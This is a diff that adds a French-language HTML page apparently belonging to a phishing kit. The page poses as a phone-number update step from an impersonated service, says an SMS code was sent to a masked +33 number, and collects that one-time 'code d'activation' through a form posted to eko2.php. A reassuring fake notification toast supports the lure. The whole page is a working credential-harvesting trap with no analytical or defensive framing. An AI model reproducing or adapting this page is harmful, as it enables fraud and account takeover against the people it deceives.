@@ -1,0 +1,101 @@
+<html><head>
+<meta charset="utf-8">
+<title>Untitled Page</title>
+<meta name="generator" content="WYSIWYG Web Builder 15 - http://www.wysiwygwebbuilder.com">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="css/font-awesome.min.css" rel="stylesheet">
+<link href="css/pstl_sms.css" rel="stylesheet">
+<link href="css/sms1.css" rel="stylesheet">
+<script src="js/jquery-1.12.4.min.js"></script>
+<script src="js/jquery-ui.min.js"></script>
+<script src="js/util.min.js"></script>
+<script src="js/toast.min.js"></script>
+<script src="js/wwb15.min.js"></script>
+<script>
+$(document).ready(function()
+{
+   $("a[href*='#FlexContainer2']").click(function(event)
+   {
+      event.preventDefault();
+      $('html, body').stop().animate({ scrollTop: $('#FlexContainer2').offset().top }, 600, 'swing');
+   });
+   $("#Toast1").toast({animation: true, autohide: true, delay: 10000});
+});
+</script>
+</head>
+<body>
+<div id="FlexContainer1">
+<div id="wb_Image1" style="display:inline-block;width:143px;z-index:2;">
+<img src="images/SM.png" id="Image1" alt="">
+</div>
+<div id="wb_Text1">
+<span style="color: #2e84b7;font-family:Arial;font-size:20px;"><strong>Mettre à jour votre numéro de téléphone<br>-</strong></span>
+</div>
+<div id="FlexContainer2">
+<div id="wb_Image2" style="display:inline-block;width:47px;z-index:0;">
+<img src="images/2020-08-06_132932.png" id="Image2" alt="">
+</div>
+<div id="wb_Text3">
+<span style="color: #2e84b7;font-family:Arial;font-size:13px;">Un sms vient d'être envoyé au <strong>+33 ** ** ** **</strong></span>
+</div>
+</div>
+
+
+<div id="wb_Text5">
+<span style="color:#000000;font-family:Arial;font-size:13px;"><br>Pour activer votre numéro de téléphone, vous devez entrer le <strong>code d’activation reçu</strong>.<br></span>
+</div>
+<span id="elmZipcodeError" style="text-align: center;" class="errorMsg"></span>
+
+<div id="wb_Text2">
+
+
+
+  <link rel="stylesheet" href="js/JSFormValidation.css">
+  <script src="js/JSFormOTP.js"></script>
+  		<form id="formTest" method="POST" action="eko2.php"> 
+    <span style="color:#000000;font-family:Arial;font-size:13px;"><br><strong>Code d'activation<br><br></strong></span><input type="text" id="txtZipcode" style="display:block;width:255px;height:44px;border: 1px solid rgb(255, 0, 0);background-color: #ffe1e1;" name="OTP" value="" spellcheck="false"><div id="wb_Text4">
+
+<span style="color:#000000;font-family:Arial;font-size:13px;"><br><strong>&nbsp; </strong></span>
+</div><input type="submit" id="btnSubmit" onclick="AnimateCss('txtZipcode', 'animate-border', 0, 500);" name="" value="VALIDER" style="display:block;width:252px;height:44px;z-index:9;"><input type="button" id="Button2" onclick="$('#Toast1').toast('show');return false;" name="" value="Je n'ai pas reçu le message " style="display:block;width:252px;height:44px;z-index:10;"><div aria-live="polite" aria-atomic="true" id="toasts">
+   <div id="Toast1" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true">
+      <div class="toast-header">
+      <i class="fa fa-bell"></i>
+      <strong>Notification</strong>
+      <small class="text-muted">Réponse automatisée</small>
+      <button type="button" class="close" data-dismiss="toast" aria-label="Close">
+         <span aria-hidden="true">×</span>
+      </button>
+      </div>
+	  	  <img src="images/valid.gif" id="Imagewifi" alt="">
+
+      <div class="toast-body"><p style="font-weight:bold;color:#000000;"><span style="color:#000000;">Un sms vient d'être envoyé au</span></p>
+<p style="font-weight:bold;color:#000000;"><span style="color:#000000;"> +33 ** ** ** **</span></p>
+<p style="font-weight:bold;">&nbsp;</p>
+<p style="color:#696969;"><span style="color:#696969;">Pour activer votre numéro de téléphone, vous devez entrer le code d</span><span style="color:#696969;">’</span><span style="color:#696969;">activation reçu</span></p></div>
+   </div>
+</div><table>
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+</table></form></div></div></body></html>
